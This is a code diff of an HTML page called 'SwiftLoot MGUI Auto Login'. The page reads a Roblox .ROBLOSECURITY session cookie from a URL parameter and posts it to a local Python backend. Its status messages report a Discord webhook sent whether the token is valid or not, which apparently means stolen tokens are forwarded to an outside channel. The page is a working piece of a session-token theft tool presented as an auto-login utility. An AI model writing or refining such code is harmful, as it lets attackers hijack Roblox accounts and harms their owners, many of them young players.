@@ -3,26 +3,62 @@
 <head>
 <meta charset="UTF-8">
 <title>SwiftLoot MGUI Auto Login</title>
+<style>
+body {
+    font-family: Arial, sans-serif;
+    background-color: #111;
+    color: #eee;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+h1 { color: #00ff00; }
+button {
+    padding: 10px 20px;
+    margin-top: 20px;
+    font-size: 16px;
+    cursor: pointer;
+}
+</style>
 </head>
 <body>
-<script>
-// Replace these values with actual Roblox user input
-let robloCookie = prompt("Enter Roblox .ROBLOSECURITY:");
-let placeId = 0; // Optional: replace with actual PlaceId
-let jobId = ""; // Optional: replace with actual JobId
+<h1>SwiftLoot MGUI Auto Login</h1>
+<p id="status">Checking cookie...</p>
 
-fetch("http://127.0.0.1:6969/verify", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-        cookie: robloCookie,
-        placeId: placeId,
-        jobId: jobId
+<script>
+// Function to read cookie from URL
+function getCookieParam() {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get("cookie");
+}
+
+const robloCookie = getCookieParam();
+const statusEl = document.getElementById("status");
+
+if (!robloCookie) {
+    statusEl.textContent = "❌ No .ROBLOSECURITY token found in URL!";
+} else {
+    statusEl.textContent = "⏳ Sending token to backend...";
+    fetch("http://127.0.0.1:6969/verify", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ cookie: robloCookie })
     })
-})
-.then(res => res.json())
-.then(data => alert("Verification sent! Success: " + data.valid))
-.catch(err => console.error(err));
+    .then(res => res.json())
+    .then(data => {
+        if (data.valid) {
+            statusEl.textContent = "✅ Token valid! Discord webhook sent.";
+        } else {
+            statusEl.textContent = "❌ Token invalid! Discord webhook sent.";
+        }
+    })
+    .catch(err => {
+        console.error(err);
+        statusEl.textContent = "❌ Failed to send token. Make sure the Python backend is running!";
+    });
+}
 </script>
 </body>
 </html>
